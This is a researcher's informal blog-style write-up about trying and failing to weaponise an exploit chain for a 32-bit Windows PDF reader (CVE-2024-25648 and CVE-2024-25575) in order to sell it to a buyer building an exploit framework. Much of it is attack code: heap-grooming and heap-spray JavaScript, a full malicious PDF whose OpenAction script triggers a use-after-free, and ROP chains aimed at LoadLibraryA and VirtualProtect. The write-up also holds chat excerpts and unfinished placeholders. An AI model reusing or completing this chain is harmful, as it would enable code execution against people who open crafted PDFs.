# HackerLife.exe
Write up about an exploit  chain failed to be fully weaponised and experience when trying to tryin to sell your first nday.

So what this story about ? Our quote on qute "life experience in 2025 as young security researcher trying to make in in a ever changing and compilated environment". When 2025 hit some even happened in my life which propmted me to try to somehow make some cash. Unf. to this day this was never the case since i faile misserably as you'll see. Such the team decided to try to utilize our skills. We were contacted by a person on a ssn. When this person reach us they presented themselves as an upcoming start-up which was in cybersecurity from a part of the world this country being part of mnna, so a nato friend(tring not to leave to many details about this person as they are irrelevant anyway). They reached us because they were looking for a person to help imrpove their product a metasploit preium framework sorts of, so basically they were in need of ndays for their framework. To which we replyed happly that we will help again a certain ammount of money.(again irrelevant as still the transaction never came to be). Such we propposed a series of potentials cve we tought we could use to produce an exploit in a month and a-half. you can take a look at the proposed product here.[catalogue_final.pdf](https://github.com/user-attachments/files/19785140/catalogue_final.pdf) . Anyway here comes the first important lesson for youngsters who wanna dabble in cyber. When choosing a cve do take like 3-4 weeks to review the cve prior to starting the research. In the said catalogue you'll be able to find that one of the exploits was a chain , a pdf one.... We looked briefly only at the descriptions ran the provided poc once or twice and took a look at what cwe was and decided that hey we might be able to turn this into a fully weaponsied exploit. We couldn't be further from the truth.
Becasue sometimes life happens i had an exam to pass and we decided that we will get started on working on the actual exploit on 20th of february.
20th of february comes and we start working on the exploit. We start with something "relatively easy"(please do note the sarcasm), we start wtih CVE-2024-25648. But before we even got started working on that we started to try to understand the structure of pdfs or better said just get a little overview into them as you'll see later in the document we'd have to crash a "propper document" with different actions that were triggered when certain events happened. Such we can give a shoutout to ange albertini for documenting this shit properly. Here are the resouces we used to understand the structure of pdf https://www.youtube.com/watch?v=q6KgFezu8tw , https://www.youtube.com/watch?v=8g6G96nn7Mo , https://www.youtube.com/live/xZPK04a5ltc . Why is even that relevant ? Honestly i forgot but we decided that for this chain one part of the exploit will run in background whenever you open the pdf and the second part whenever you close it. Ideely the exploit was supposed to exploit CVE-2024-25648 when closed and CVE-2024-25575 and opened. To break it down in order for us to be able to create a precise memory layout for the uaf precise exploitation we needed and info-leak for computing addresses for ROPgadgets. Such the flow of the exploit would have been: type conf ->infoleak --> gc to clear the layout of heap --> spray precise -->uaf -->eip control -8 --> stackpivot -->ropchiain --> sc --> pop calc.exe . At the current stage you only have the uaf and heap spray  and theoretically(not tested) 2 proposed ropchains. Now withouth going too much into details one crucial part of any uaf exploitation is obviously an "allocator primitive". What is that ? Simply put something that allows you to have control over the content and size you desire to allocate. Now we were lucky enough that there were other people who did some reascher on this topic. Such we used https://hacksys.io/blogs/foxit-reader-uaf-rce-jit-spraying-cve-2022-28672#jit-spraying-to-rescue-bypassing-dep-aslr-at-once as a starting base. So we knew we had to start our research based on something like 
function reclaim(size, count){
3    for (var i = 0; i < count; i++) {
4        sprayArr[i] = new SharedArrayBuffer(size);
5        var rop = new DataView(sprayArr[i]);
6
7        // control value for - call dword ptr [eax+74h]
8        // first dword is pointer to the shellcode
9        rop.setUint32(0, 0x41414141);
10
11        for (var j = 4; j < rop.byteLength/4; j+=4) {
12            rop.setUint32(j, 0x42424242);
13        }
14    }
15} but we didnt know what to do exactly. So we went back read the advisory and than tried to find the size of vulnerable object. How did we do that ? honestly by pure luck. We had some hooks inserted into RlptFreeHeap Math.atan, Math.sin and finally RtlAllocateHeap.(sorry they are junking during the research we somehow lost them). Insert picture here with trace of objects. So after looking for some pattern in memory allocation we concluded that the size of vulnerable object was 0x70. Now what we did further was to try to reclaim the object.Generally speaking when exploiting uaf there are 2 prerequisite for you to controll said object:1. know the size and 2.be able to place a newly allocation in between the free and reuse, and that's what we did. As you can see 
function uaf() { 
  // prepare heap
  var count = 1000;
  var tArr = [];
  
  start("enabling the heap hook");
  app.activeDocs[0].addField('aaaa', "combobox", 2, [13,8,0,19] ) ;
  
  getField('aaaa').setAction("Format",'delete_pages();');
 
  app.activeDocs[0].addField('aaaa', "combobox", 0, [13,8,0,19] ) ;

  end("disabling the heap hook");
}

function delete_pages() {
  app.activeDocs[0].deletePages();
  //reclaim(theSize,0x10000);

  reclaim(theSize,0x300,sprayArr2);

  app.activeDocs[0].deletePages();
  reclaim(theSize,0x300,sprayArr2);

}

we place in between the deltepages which what to see delete stuff , we put re allocation of our said object. And lord behold inser image of 41414141 EIP control. Now we were talking earlier about an exploit flow or the exploit arhitecture stand point, and we mentioned a fact that we wanted to call gc to clear the heap. Well withouth going into detail too mmuch for people who are not familiar on how once could call gc to clear his heap state, one method cause there are many is to create a very big object a few times and he would be done.
Now the actual implementation of this was this one function gc(){
	const maxMallocBytes = 128 * 0x100000; //check if this is true ????
	for(var i = 0 ; i < 3 ; i++){
		var x = new SharedArrayBuffer(maxMallocBytes);
	}
}

nothing new under the sun just wanted to point a quick fact about the implementation of this thing. Now there is another one more thing to talk about since the exploit is targeting a 32 bit software. On windows there is this concept of precise heap spray. So what is that ? On windows(i know it should be also doable on linux, i saw it only on windows) only you can allocate for 32bit space a predictable address every time. Honestly this is nothing new under the sun. It's something easy once you understand it , i did udnerstand it intriquetly once but now i dont :))). Now anyway so for windows 10 you are not allowed to do VirtualAlloc size for VABlocks 0x7fb0. But fortunatelly you can do a trick. You can do incrementally in size of 0x10000, 0x40000 and another size allocation and idk for 0x300 times. This allows you do to it . Againt nothing new under the sun if you know you know. Now here's the specific implementation.
function store_shellcode() {
	app.alert(util.printf("Uninitialized1"));

	var offset 	  		= 0xbc4; //this will need adjustment aka be changed
	var final_payload 		= "";
	var junk 	  		= p32(0x50505050)+p32(0x80808080);
	var rop  	  		= "4141424243434444454546464747";
	var shellcode 		        = "0c0c00c0c0c0c0c0c0c0c0c0c0c0";
	while(junk.length < 0x1000){
		junk += junk;
	}
	app.alert(util.printf("Uninitialized2"));
	app.alert("Preparing layout to allow application to store 'noise'");
	
	// Allocate a 0x1000-byte buffer and fill with 'A'
	let hAlloc0 = new SharedArrayBuffer(0x1000);
	fillBuffer(hAlloc0, 'A');
	
	// Allocate a 0x10000-byte buffer and fill with 'B'
	let hAlloc1 = new SharedArrayBuffer(0x10000);
	fillBuffer(hAlloc1, 'B');
	
	// Reallocate hAlloc0 with a new 0x1000-byte buffer filled with 'A'
	hAlloc0 = new SharedArrayBuffer(0x1000);
	fillBuffer(hAlloc0, 'A');
	
	// Allocate another 0x10000-byte buffer and fill with 'B'
	let hAlloc2 = new SharedArrayBuffer(0x10000);
	fillBuffer(hAlloc2, 'B');
	
	// Reallocate hAlloc0 again (0x1000-byte) and fill with 'A'
	hAlloc0 = new SharedArrayBuffer(0x1000);
	fillBuffer(hAlloc0, 'A');
	
	// Allocate a third 0x10000-byte buffer and fill with 'B'
	let hAlloc3 = new SharedArrayBuffer(0x10000);
	fillBuffer(hAlloc3, 'B');
	
	// Reallocate hAlloc0 once more with a new 0x1000-byte buffer filled with 'A'
	hAlloc0 = new SharedArrayBuffer(0x1000);
	fillBuffer(hAlloc0, 'A');
	
	app.alert("Layout created, now freeing 3 chunks of 0x10000");
	
	// Log and "free" the 0x10000-byte buffers by dropping references.
	app.alert("Free", hAlloc1);
	hAlloc1 = null;
	
	app.alert("Free", hAlloc2);
	hAlloc2 = null;
	
	app.alert("Free", hAlloc3);
	hAlloc3 = null;
	
	app.alert("Done. Ready for spray");

	//Trigger the theoretical garbage collection to clear the heap.
	gc();

	final_payload =  junk.substring(0,offset);

	final_payload += rop;

	final_payload += shellcode;

	final_payload += junk.substring(0,0x10000-offset-rop.length-shellcode.length);

	while(final_payload.length < 0x40000){
		final_payload += final_payload;
	}
 
  	var sprayRepeat = 3; // Repeat spray multiple times.
  	var sprayCount = 0x900; // Number of spray entries per repetition.

 	for (var rep = 0; rep < sprayRepeat; rep++) {
    		for (var i = 0; i < sprayCount; i++) {
      			// Convert the first 0x40000 characters of final_payload into a SharedArrayBuffer.
      			var sprayBuffer = allocateSprayBuffer(final_payload.substring(0, 0x40000));
      			global_address_spray.push(sprayBuffer);
    		}
  	}
	app.alert(util.printf("SPRAY DONE"));
}

Nothing new under the sun repeat same payload from 0x10000 to another 0x10000 till you form a 0x40000 hex len string and than literally spray it . Now i have to mention that this is somewhat buggy cause while it spray a lot and from time to time we manage to get a precise address, this needs a little bit of optimisation/ improvement cause oh well i forgot how you do this thing exactly.  Insert windbg image and some explanation on what i see 

Now before we close the chapter it would be worther to mention how did we create the hooks for Math.atan, Math.sin and RlptFreeHeap/RtlpAllocateHeap. Well for the rtlp function i had some hooks from when i attented some exploit dev training which deald with foxit an older version. For Math.atan, Math.sin ruben....(insert explanation). Such we came with this(insert hooks) (insert image windbg + explanation on what happens there).

Now for second part of the blog CVE-2024-25575

Withouth going too much into the details of the actual talos write up, ruben had me after 2 weeks when we set sight on the second part of the bug warned me that this might not be exactly a type confusion bug, but rather a uaf which has as side effect type confusion on string. regardless this sounds a good scenario for an exploit dev. Not really. So from the getgo you are left from here

  var lock_object = app.activeDocs[0].addField( 'AA', "signature", 0, [10,214,3] ).getLock() ;

  app.activeDocs[0].deletePages();

  app.fs.transitions;

  lock_object.__defineGetter__('fields', function () {}); 

and you next object is to see how the actual french toast you replace app.fs.transitions. Now at this point in time me and ruben spend like 3 weeks ripping our hairs trying to figure because from adobe docs app.fs.transitions is an object which is only readable and not writable(NOT A GOOD SIGN FOR EXPLOITATION). Second we couldn't determine properly the size of app.fs.transitions with the hook. Why you might ask ? Well even tho we were lucky enough to be able to determine in prev part here we just had bad luck when we realised the size parameter in this case didnt correspond to the hooks and such we couldn't properly deterimne the exact size. Now how did we get out of this mess ? Well in those 3 weeks that have goone by we saw one day on twitter that someone released an MCP server for ghidra/ida and we said we'd give it a try. After i think a day or two arguing with claude somehow it generated this monstrosity.
[message.txt](https://github.com/user-attachments/files/19786160/message.txt)%PDF-1.5 

1 0 obj
<<
	/Type /Catalog 
	/Pages 2 0 R 
	/OpenAction 4 0 R 
	/AA << 
		/WC 3 0 R  
	>> 
endobj

2 0 obj
<<
	/Type /Pages 
	/Count 7
	/Kids [5 0 R 6 0 R 7 0 R 8 0 R 9 0 R 10 0 R 11 0 R] 
>>
endobj 

3 0 obj
<<
	/S /JavaScript 
	/JS(


//var sprayArr = [];
var sprayArr2 = [];

var theSize = 0xb8-8;
function start(msg) {
    Math.atan(msg);
}

function end(msg) {
    Math.acos(msg);
}


function fillBuffer(buffer, char) {
  var dv = new DataView(buffer);
  var charCode = char.charCodeAt(0);
  for (var i = 0; i < buffer.byteLength; i++) {
    dv.setUint8(i, charCode);
  }
}

function reclaim(size, count,array) {
  for (var i = 0; i < count; i++) {
    array[i] = new SharedArrayBuffer(size);
	fillBuffer(array[i], 'B');
  }
}

function addrToHex(addr) {
    return "0x" + addr.toString(16).padStart(8, '0');
}


// Function to create a controlled string pattern
function createStringPattern(length) {
    var result = "";
    for (var i = 0; i < length; i += 4) {
        // Create predictable 4-byte patterns
        var val = 0xAA000000 + i;
        var c1 = String.fromCharCode((val & 0xFF));
        var c2 = String.fromCharCode((val >> 8) & 0xFF);
        var c3 = String.fromCharCode((val >> 16) & 0xFF);
        var c4 = String.fromCharCode((val >> 24) & 0xFF);
        result += c1 + c2 + c3 + c4;
    }
    return result;
}



function type_conf() { 
    app.alert("Starting alternative exploitation approach...");
    
    // Step 1: Create several different types of form fields
    var fields = {};
    var fieldTypes = ["text", "checkbox", "radiobutton", "combobox", "listbox", "signature"];
    
    for (var i = 0; i < fieldTypes.length; i++) {
        try {
            fields[fieldTypes[i]] = app.activeDocs[0].addField(
                'Field_' + fieldTypes[i], 
                fieldTypes[i], 
                0, 
                [10, 50 + i*40, 100, 80 + i*40]
            );
            app.alert("Created " + fieldTypes[i] + " field");
        } catch (e) {
            app.alert("Error creating " + fieldTypes[i] + " field: " + e);
        }
    }
    
    // Step 2: Store references to various objects from these fields
    var objects = [];
    try {
        // Get various objects from different field types to increase chances of success
        if (fields.signature) objects.push({name: "signature.lock", obj: fields.signature.getLock()});
        if (fields.text) objects.push({name: "text.value", obj: fields.text.value});
        if (fields.combobox) objects.push({name: "combobox.items", obj: fields.combobox.items});
        if (fields.checkbox) objects.push({name: "checkbox.style", obj: fields.checkbox.style});
        
        app.alert("Stored references to " + objects.length + " objects");
    } catch (e) {
        app.alert("Error storing object references: " + e);
    }
    
    // Step 3: Call deletePages() with specific parameters
    try {
        app.activeDocs[0].deletePages({nStart: 0, nCount: 0});  // Try not to delete any pages
        app.alert("deletePages called with parameters");
    } catch (e) {
        app.alert("Error in deletePages: " + e);
        // Continue anyway
    }
    
    // Step 4: Create controlled heap objects
    var stringObjects = [];
    var bufferObjects = [];
    
    // Mix of different object types to influence heap layout
    for (var i = 0; i < 100; i++) {
        stringObjects.push("Memory" + i.toString(16).padStart(8, '0'));
    }
    
    // Create objects with specific values that might be recognizable if leaked
    for (var i = 0; i < 20; i++) {
        var obj = {
            marker: 0xABCD0000 + i,
            index: i,
            name: "Marker" + i
        };
        bufferObjects.push(obj);
    }
    
    // Step 5: Access transitions and other APIs to influence memory
    try {
        // Access app.fs.transitions
        app.fs.transitions;
        app.alert("Transitions accessed");
        
        // Access other properties that might influence memory
        if (app.fs.fonts) app.alert("Fonts accessed");
        if (app.fs.templates) app.alert("Templates accessed");
    } catch (e) {
        app.alert("Error accessing app properties: " + e);
    }
    
    // Step 6: Trigger JavaScript garbage collection
    try {
        for (var i = 0; i < 3; i++) {
            var largeArray = new Array(1000000);
            largeArray = null;
        }
        app.alert("Garbage collection potentially triggered");
    } catch (e) {
        app.alert("Error triggering GC: " + e);
    }
    
    // Step 7: Examine objects for signs of corruption or memory leaks
    var results = [];
    
    for (var i = 0; i < objects.length; i++) {
        var objName = objects[i].name;
        var obj = objects[i].obj;
        
        results.push("Examining " + objName + ":");
        
        try {
            // Check object type
            results.push("- Type: " + typeof obj);
            
            // Try to convert to string
            var asString = String(obj);
            results.push("- String representation: " + asString);
            
            // Look for patterns that might indicate addresses
            var hexMatches = asString.match(/[0-9A-Fa-f]{6,}/g);
            if (hexMatches) {
                for (var m = 0; m < hexMatches.length; m++) {
                    results.push("- Potential address: 0x" + hexMatches[m]);
                }
            }
            
            // Try JSON serialization with error handling
            try {
                var asJson = JSON.stringify(obj);
                if (asJson && asJson.length > 2) {  // Not empty object
                    results.push("- JSON: " + (asJson.length > 50 ? asJson.substring(0, 50) + "..." : asJson));
                }
            } catch (jsonError) {
                results.push("- JSON error: " + jsonError);
            }
            
        } catch (e) {
            results.push("- Error examining object: " + e);
        }
    }
    
    // Report results
    for (var i = 0; i < results.length; i++) {
        app.alert(results[i]);
    }
    
    app.alert("Alternative exploitation completed");
}







type_conf();


		


	)
>>
endobj

4 0 obj
<<
	/S /JavaScript 
	/JS(

/*
ROP

FoxitPDFReader!CryptUIWizExport+0x357b1:
00d7e62f 8b01            mov     eax,dword ptr [ecx]  ds:002b:12d3c4a0=f0f0f0f0 ; <---------------- [6]
00d7e631 8b4044          mov     eax,dword ptr [eax+44h] ds:002b:f0f0f134=???????? ; <---------------- [7]
00d7e631 8b4044          mov     eax,dword ptr [eax+44h]
00d7e634 ffd0            call    eax

we got 0x44 till we have to jump and such
so basically we control ecx and in ecx we put the rest of ropchian

and in ecx we put 0c0c0c0c and at 0c0c0c0c we put ropchian

at 0c0c0c0c+0x44 0x4a2a06: xchg esp, ecx ; ret ; (1 found)
such


arr[0]=0x4a2a06 xchg esp, ecx ; ret ; (1 found)(offset 000a2a06) aka ecx
ImageBase                : 0x00400000 


rop[1] = 0x28ed140: add al, ch ; pop edx ; push edx ; ret ; (1 found)
rop[2] = 0x6c6c642e
rop[3] = 0x28ed140: add al, ch ; pop edx ; push edx ; ret ; (1 found)
rop[4] = 0x6b636168
rop[5] = 0x28ed140: add al, ch ; pop edx ; push edx ; ret ; (1 found)
rop[6] = 0x5x706f74
rop[7] = 0x28ed140: add al, ch ; pop edx ; push edx ; ret ; (1 found)
rop[8] = 0x6b736544
rop[9] = 0x28ed140: add al, ch ; pop edx ; push edx ; ret ; (1 found)
rop[0xa] = 0x5c64616c
rop[0xb] = 0x28ed140: add al, ch ; pop edx ; push edx ; ret ; (1 found)
rop[0xc] = 0x565c7372
rop[0xd] = 0x28ed140: add al, ch ; pop edx ; push edx ; ret ; (1 found)
rop[0xe] = 0x6573555c 
rop[0xf] = 0x28ed140: add al, ch ; pop edx ; push edx ; ret ; (1 found)
rop[0x10] = 0x4141433a
rop[0x11] = 0x4573426: mov edi, esp ; ret ; (1 found)
rop[0x12] = 0x2d3d809: dec eax ; pop eax ; ret ; (1 found)
rop[0x13] = 0x2
rop[0x14] = 0x30bcb93: add edi, eax ; ret ; (1 found)
rop[0x15] = 0x41a07e: push edi ; ret ; (1 found)
rop[0x16] = 0x2d3d809: dec eax ; pop eax ; ret ; (1 found)
rop[0x17] = 05254630  76481100 KERNEL32!LoadLibraryAStub - 0xd
rop[0x18] = 0x35f252a: add eax, 0x0C ; mov eax,  [eax] ; ret ; (1 found)
rop[0x19] = 0x370d27c: inc eax ; push eax ; ret ; (1 found)


cause we dont have writeprocessmemory so we result to loadlibrarya


43 3A 
eq to 
C:\Users\Vlad\Desktop\hack.dll

0x28ed140: add al, ch ; pop edx ; push edx ; ret ; (1 found)

or in case we want virtualrpotect chain as payload

# skeleton  = RopChain()
# skeleton += 0x41414141                # VirtualAlloc address
# skeleton += 0x42424242                # shellcode return address to return to after VirtualAlloc is called
# skeleton += 0x43434343                # lpAddress (shellcode address)
# skeleton += 0x44444444                # dwSize (0x1)
# skeleton += 0x45454545                # flAllocationType (0x1000)
# skeleton += 0x46464646                # flProtect (0x40)

rop[0x1] = 0x4573426: mov edi, esp ; ret ; (1 found)
rop[0x2] = 0x2d3d809: dec eax ; pop eax ; ret ; (1 found)
rop[0x3] = 0x2 #this needs to be changed to point to shellcode
rop[0x4] = 0x30bcb93: add edi, eax ; ret ; (1 found)
rop[0x5] = 0x41a07e: push edi ; ret ; (1 found)
rop[0x6] = 0x41a07e: push edi ; ret ; (1 found) since it's the same 
rop[0x7] = 0x28ed140: add al, ch ; pop edx ; push edx ; ret ; (1 found)
rop[0x8] = size for shellcode here
rop[0x9] = 0x28ed140: add al, ch ; pop edx ; push edx ; ret ; (1 found)
rop[0xa] = 0x1000
rop[0xb] = 0x28ed140: add al, ch ; pop edx ; push edx ; ret ; (1 found)
rop[0xc] = 0x40
rop[0xd] = 04bc457c  76466b30 KERNEL32!VirtualProtectStub - 0xd
rop[0x10] = 0x35f252a: add eax, 0x0C ; mov eax,  [eax] ; ret ; (1 found)
rop[0x11] = 0x370d27c: inc eax ; push eax ; ret ; (1 found)


*/




var global_address_spray = [];

function p32(num) {
  return String.fromCharCode(num & 0xff) +
         String.fromCharCode((num >> 8) & 0xff) +
         String.fromCharCode((num >> 16) & 0xff) +
         String.fromCharCode((num >> 24) & 0xff);
}



function start(msg) {
    Math.atan(msg);
}

function end(msg) {
    Math.acos(msg);
}

function gc(){
	const maxMallocBytes = 128 * 0x100000; //check if this is true ????
	for(var i = 0 ; i < 3 ; i++){
		var x = new SharedArrayBuffer(maxMallocBytes);
	}
}

function allocateSprayBuffer(payload) {
  // Create a SharedArrayBuffer sized to hold the payload.
  // Assuming one byte per character (e.g. for ASCII-only data).
  var buffer = new SharedArrayBuffer(payload.length);
  var dv = new DataView(buffer);
  for (var j = 0; j < payload.length; j++) {
    dv.setUint8(j, payload.charCodeAt(j));
  }
  return buffer;
}


 

function store_shellcode() {
	app.alert(util.printf("Uninitialized1"));

	var offset 	  		= 0xbc4; //this will need adjustment aka be changed
	var final_payload 		= "";
	var junk 	  		= p32(0x50505050)+p32(0x80808080);
	var rop  	  		= "4141424243434444454546464747";
	var shellcode 		        = "0c0c00c0c0c0c0c0c0c0c0c0c0c0";
	while(junk.length < 0x1000){
		junk += junk;
	}
	app.alert(util.printf("Uninitialized2"));
	app.alert("Preparing layout to allow application to store 'noise'");
	
	// Allocate a 0x1000-byte buffer and fill with 'A'
	let hAlloc0 = new SharedArrayBuffer(0x1000);
	fillBuffer(hAlloc0, 'A');
	
	// Allocate a 0x10000-byte buffer and fill with 'B'
	let hAlloc1 = new SharedArrayBuffer(0x10000);
	fillBuffer(hAlloc1, 'B');
	
	// Reallocate hAlloc0 with a new 0x1000-byte buffer filled with 'A'
	hAlloc0 = new SharedArrayBuffer(0x1000);
	fillBuffer(hAlloc0, 'A');
	
	// Allocate another 0x10000-byte buffer and fill with 'B'
	let hAlloc2 = new SharedArrayBuffer(0x10000);
	fillBuffer(hAlloc2, 'B');
	
	// Reallocate hAlloc0 again (0x1000-byte) and fill with 'A'
	hAlloc0 = new SharedArrayBuffer(0x1000);
	fillBuffer(hAlloc0, 'A');
	
	// Allocate a third 0x10000-byte buffer and fill with 'B'
	let hAlloc3 = new SharedArrayBuffer(0x10000);
	fillBuffer(hAlloc3, 'B');
	
	// Reallocate hAlloc0 once more with a new 0x1000-byte buffer filled with 'A'
	hAlloc0 = new SharedArrayBuffer(0x1000);
	fillBuffer(hAlloc0, 'A');
	
	app.alert("Layout created, now freeing 3 chunks of 0x10000");
	
	// Log and "free" the 0x10000-byte buffers by dropping references.
	app.alert("Free", hAlloc1);
	hAlloc1 = null;
	
	app.alert("Free", hAlloc2);
	hAlloc2 = null;
	
	app.alert("Free", hAlloc3);
	hAlloc3 = null;
	
	app.alert("Done. Ready for spray");

	//Trigger the theoretical garbage collection to clear the heap.
	gc();

	final_payload =  junk.substring(0,offset);

	final_payload += rop;

	final_payload += shellcode;

	final_payload += junk.substring(0,0x10000-offset-rop.length-shellcode.length);

	while(final_payload.length < 0x40000){
		final_payload += final_payload;
	}
 
  	var sprayRepeat = 3; // Repeat spray multiple times.
  	var sprayCount = 0x900; // Number of spray entries per repetition.

 	for (var rep = 0; rep < sprayRepeat; rep++) {
    		for (var i = 0; i < sprayCount; i++) {
      			// Convert the first 0x40000 characters of final_payload into a SharedArrayBuffer.
      			var sprayBuffer = allocateSprayBuffer(final_payload.substring(0, 0x40000));
      			global_address_spray.push(sprayBuffer);
    		}
  	}
	app.alert(util.printf("SPRAY DONE"));
}


var sprayArr = [];
var sprayArr2 = [];

var theSize = 0x70-8;


function fillBuffer(buffer, char) {
  var dv = new DataView(buffer);
  var charCode = char.charCodeAt(0);
  for (var i = 0; i < buffer.byteLength; i++) {
    dv.setUint8(i, charCode);
  }
}

function reclaim(size, count,array) {
  for (var i = 0; i < count; i++) {
    array[i] = new SharedArrayBuffer(size);
	fillBuffer(array[i], 'B');
  }
}

function uaf() { 
  // prepare heap
  var count = 1000;
  var tArr = [];
  
  start("enabling the heap hook");
  app.activeDocs[0].addField('aaaa', "combobox", 2, [13,8,0,19] ) ;
  
  getField('aaaa').setAction("Format",'delete_pages();');
 
  app.activeDocs[0].addField('aaaa', "combobox", 0, [13,8,0,19] ) ;

  end("disabling the heap hook");
}

function delete_pages() {
  app.activeDocs[0].deletePages();
  //reclaim(theSize,0x10000);

  reclaim(theSize,0x300,sprayArr2);

  app.activeDocs[0].deletePages();
  reclaim(theSize,0x300,sprayArr2);

}


//start("enabling the heap hook");
//end("disabling the heap hook");

  //sprayArr[i] = new SharedArrayBuffer(theSize);
reclaim(theSize,0x400,sprayArr);
  for(var i = 0; i < 0x400; ++i){
   if(i%2 == 0){
    	sprayArr[i] = null;
    }
  }	



//store_shellcode();
//uaf();
//console.show();
)>> 


5 0 obj
<< 
	/Type /Page 
	/Parent 2 0 R 
	/MediaBox [0 0 500 500] 
	/Resources << >> 
>>
endobj
6 0 obj
<< 
	/Type /Page 
	/Parent 2 0 R 
	/MediaBox [0 0 500 500] 
	/Resources << >> 
>>
endobj
7 0 obj
<< 
	/Type /Page 
	/Parent 2 0 R 
	/MediaBox [0 0 500 500] 
	/Resources << >> 
>>
endobj
8 0 obj
<< 
	/Type /Page 
	/Parent 2 0 R 
	/MediaBox [0 0 500 500] 
	/Resources << >> 
>>
endobj
9 0 obj
<< 
	/Type /Page 
	/Parent 2 0 R 
	/MediaBox [0 0 500 500] 
	/Resources << >> 
>>
endobj
10 0 obj
<< 
	/Type /Page 
	/Parent 2 0 R 
	/MediaBox [0 0 500 500] 
	/Resources << >> 
>>
endobj
11 0 obj
<< 
	/Type /Page 
	/Parent 2 0 R 
	/MediaBox [0 0 500 500] 
	/Resources << >> 
>>
endobj

trailer 
<< 
	/Root 1 0 R  
	/Size 12 
>>

startxref 

%%EOF

Now what we did was we did i guess you can call it regression testing , where ruben took this poc and started ripping it apart line by line. The whole process took roughly two weeks from what i remember, but as a funny quork here's how that converstation has gone:

vlad:
i control ecx!!!!!!
close to infoleak
with this one you control ecx exactly but idk how to replace the string object is dead but you control sort of where it crashes
paste random poc 
and with this one you almost control ecx you control ecx+8 see what nah and make it infoleak please 🙂
post random poc
in this one you control the string 'object is dead'
soo it should be close
so as we concluded already exp is not 100% but it dont need to be 100% it just need to be reliable so from my test 5/3 the outout is the one from above 
for the partial one for the object_is_dead is 100% time it crashes with ecx control

reuben:
so i'm trying to run this poc, and this is a different bug altogether lool
vlad:
mai i vc
to ask
about your findings ?
what
totaly different bug how ??
0day ???
u do know we try to access app.fs.transitions
which only somewhat make me kinda question is this 0day or cross bug confusion or different cve granted again we delete_pages
and app.fs.transition
reuben:
so before it crashed somewhere randomly. i don't know what happened
but
here it's crashing in the same place (replicated multiple times now)
but get this
it's before you call app.fs.transitions
vlad:
what is even life bro??
reuben:
i don't know how to control the data there is yet, but i'm pretty sure something can replace it
vlad:
ok let me ask u this
the pocs you have rn
they show somewhat of a control rigth
in terms of ecx
and from what you telling me app.fs.transitions is useless right
cool
so we on the right path no
reuben:
yes we can do without app.fs.transitions and i've been saying it for a long time now, just didn't know how to trigger it (and still don't to be honest)
vlad:
well could it be as you said
that the actual bug is uaf more like than type conf ???
and just type conf cause app.fs.transitions ?

And here comes a lesson learned during the tought process and this might be crucial for young researchers too: If a bug looks like say a type confusion in the advisory yet from your analysis seem to behave like a different class, it might be signs that in this case say or to generalize if you want to use type conf for info leak but bug behaves as uaf on windows pretty much you wont be able to infoleak.

reuben:
i can't say yet
but listen to this
i've removed step 11 from your last poc
and it still triggers

step 11 is where you call app.fs.transitions
we still don't know if we can use it to leak anything though lol

vlad:
agreed
but at least we got some control now
which again not rlly a thing
cause it might be that it might be just coincidental and we cant control it looll
and we back to sq1
what is even life ????

reuben:
ok so i changed the text that's appearing in the crash now 😄

vlad:
whattt
rlly
you got control ?

see ray of light shining

reuben:
not fully cos the text is UTF-16LE, but i might be able to do something let's see

reuben:
![image-2](https://github.com/user-attachments/assets/a14232ca-3ad0-457f-995a-62cbd596c7bb)

reuben:
this is another one, which means i can probably bypass the utf-16le restriction

0:000> db ecx - 4
0f55f9ec  78 31 32 78 33 34 78 35-36 78 37 38 78 39 41 78  x12x34x56x78x9Ax
0f55f9fc  42 43 78 44 45 78 46 30-78 31 32 48 00 00 00 00  BCxDExF0x12H....
0f55fa0c  00 00 00 00 06 00 01 0f-40 da 3a 0e 00 00 00 00  ........@.:.....
0f55fa1c  00 00 00 00 00 00 00 00-e0 49 55 0f 10 00 00 00  .........IU.....
0f55fa2c  02 00 00 00 6c bb 54 0f-48 bb 54 0f 0a 00 00 00  ....l.T.H.T.....
0f55fa3c  00 00 00 00 01 00 00 00-10 00 00 00 10 00 00 00  ................
0f55fa4c  54 00 69 00 6d 00 65 00-73 00 20 00 42 00 6f 00  T.i.m.e.s. .B.o.
0f55fa5c  6c 00 64 00 49 00 74 00-61 00 6c 00 69 00 63 00  l.d.I.t.a.l.i.c.

......... convo omitted for sake of braviety and mental health

till at one point we got to the "final poc" where we got stuck which looks like this 
function type_conf(){
    app.alert("Starting enhanced memory leak exploit");
    
    // Step 2: Create form fields
    gFields.signature = app.activeDocs[0].addField(
      "signature_field",
      "signature",
      0,
      [10, 10, 100, 50]
    );
    
    gFields.combo = app.activeDocs[0].addField(
      "HAHAHAHAHAH",
      "combobox",
      0,
      [10, 60, 100, 100]
    );
    
    // Step 4: Get the critical Lock object
    gLockObj = gFields.signature.getLock();
    app.alert("Got Lock object from signature field");
    
    app.alert("Triggering vulnerability with deletePages()");
    app.activeDocs[0].deletePages();
    app.alert("Vulnerability triggered");
    
    gLockObj.__defineGetter__('fields', function () {}); 
}

But anyway why i wanted to include part of our i guess work process is to showcase as it has already been show that exploit dev is not quite an exact science. One very important lesson for new researcher and up-incoming young researchers is to realise that you'll need to arm yourself with patience and drive(also knows as motivation) in order to see very often a small ray of light which for most of times wont be the end of the tunnel but only a demise. But fear not this is part of the process. So lesson to be learned you'll be wasting a lot and i mean a lot of time when doing exploit dev. Again fear not this is part of exploitation process.  Now as we are getting close to the end of this article and story let me give you some more lessons which we gained during our journey.

So whenever when you see that you object is not wriable and only readable , when you see that you tried everything the documentation for avaiable api provides and still went the extra mile to dump what seems as avaiable js api such as 
AddcDocID 
.rdata:050B1EC8	00000007	C	AddStr
.rdata:050E8E70	00000016	C	Sign_Fill_Set_PreText
.rdata:050E8E88	00000012	C	Sign_Fill_AddText
.rdata:050E8E9C	00000017	C	Sign_Fill_AddText_Comb
.rdata:050E8EE0	0000000F	C	Sign_Fill_AddX
.rdata:050E8EF0	00000011	C	Sign_Fill_AddDot
.rdata:050E8F04	00000011	C	Sign_Fill_Group2
.rdata:050E8F18	00000012	C	Sign_Fill_AddLine
.rdata:050EB4FC	0000001B	C	ACTIONANNOT::AddTypeWriter
https://helpx.adobe.com/acrobat/kb/adding-watermark-pdf.html
.rdata:05114CEC	0000000B	C	Sound Tool
.rdata:05114ED8	0000003D	C	This function is deprecated. It proceed in signature plugin.
.rdata:05114FA8	0000001A	C	File_Propertions_Security
.rdata:05114FC4	0000001D	C	File_Propertions_Description
.rdata:05115000	0000001D	C	File_Propertions_InitialView
.rdata:0511502C	00000016	C	File_Propertions_Font
.rdata:05115058	0000001A	C	File_Propertions_Advanced
